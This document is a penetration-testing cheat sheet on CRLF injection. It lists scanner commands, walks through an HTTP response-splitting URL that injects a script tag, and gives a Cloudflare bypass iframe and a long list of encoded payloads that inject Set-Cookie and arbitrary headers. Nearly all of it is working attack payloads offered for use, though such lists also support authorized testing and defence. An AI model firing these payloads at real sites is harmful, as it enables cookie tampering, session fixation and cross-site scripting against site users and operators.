# CRLF

## Tools

```bash
# https://github.com/MichaelStott/CRLF-Injection-Scanner
crlf_scan.py -i <inputfile> -o <outputfile>
# https://github.com/dwisiswant0/crlfuzz
crlfuzz -u "http://target"
# https://github.com/ryandamour/crlfmap
crlfmap scan --domains domains.txt --output results.txt
```

```text
The following simplified example uses CRLF to:

1. Add a fake HTTP response header: Content-Length: 0. This causes the web browser to treat this as a terminated response and begin parsing a new response.
2. Add a fake HTTP response: HTTP/1.1 200 OK. This begins the new response.
3. Add another fake HTTP response header: Content-Type: text/html. This is needed for the web browser to properly parse the content.
4. Add yet another fake HTTP response header: Content-Length: 25. This causes the web browser to only parse the next 25 bytes.
5. Add page content with an XSS: <script>alert(1)</script>. This content has exactly 25 bytes.
6. Because of the Content-Length header, the web browser ignores the original content that comes from the web server.

    http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E

- Cloudflare CRLF bypass
<iframe src=”%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)”>

Payload list:
/%%0a0aSet-Cookie:crlf=injection
/%0aSet-Cookie:crlf=injection
/%0d%0aSet-Cookie:crlf=injection
/%0dSet-Cookie:crlf=injection
/%23%0aSet-Cookie:crlf=injection
/%23%0d%0aSet-Cookie:crlf=injection
/%23%0dSet-Cookie:crlf=injection
/%25%30%61Set-Cookie:crlf=injection
/%25%30aSet-Cookie:crlf=injection
/%250aSet-Cookie:crlf=injection
/%25250aSet-Cookie:crlf=injection
/%2e%2e%2f%0d%0aSet-Cookie:crlf=injection
/%2f%2e%2e%0d%0aSet-Cookie:crlf=injection
/%2F..%0d%0aSet-Cookie:crlf=injection
/%3f%0d%0aSet-Cookie:crlf=injection
/%3f%0dSet-Cookie:crlf=injection
/%u000aSet-Cookie:crlf=injection
/%0dSet-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
/%0d%0aheader:header
/%0aheader:header
/%0dheader:header
/%23%0dheader:header
/%3f%0dheader:header
/%250aheader:header
/%25250aheader:header
/%%0a0aheader:header
/%3f%0dheader:header
/%23%0dheader:header
/%25%30aheader:header
/%25%30%61header:header
/%u000aheader:header
```

